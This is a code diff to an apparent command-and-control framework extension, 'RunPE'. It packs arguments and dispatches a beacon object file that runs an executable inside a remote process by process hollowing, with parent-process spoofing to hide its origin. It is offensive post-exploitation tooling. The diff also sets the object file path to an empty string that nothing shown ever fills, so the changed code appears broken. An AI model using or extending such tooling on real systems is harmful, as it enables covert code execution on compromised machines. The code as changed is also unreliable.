@@ -30,7 +30,6 @@ class Packer:
         self.size += 4
 
 def RunPE( demon_id, *args ):
-    
     demon               = Demon( demon_id )
     task_id: str        = None
     packer: Packer      = Packer()
@@ -38,6 +37,7 @@ def RunPE( demon_id, *args ):
     ppid: int           = None
     exe_path: str       = None
     exe_payload: bytes  = None
+    object_file_path    = ""
     
     if ( len( args ) not in ( 2,3 ) ):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
@@ -66,10 +66,9 @@ def RunPE( demon_id, *args ):
     message += f" spoofing parent as pid {ppid}" if ppid != 0 else ""
     task_id = demon.ConsoleWrite( demon.CONSOLE_TASK, message)
     
-    demon.InlineExecute(task_id, "go", "data/extensions/RunPE/RunPE.py", packer.getbuffer(), False )
+    demon.InlineExecute(task_id, "go", object_file_path, packer.getbuffer(), False )
 
     return task_id
-
 
 description = """A BOF to execute a PE file in the address space of a remote process
 \t         using the process hollowing technique. Supports parent proces spoofing."""
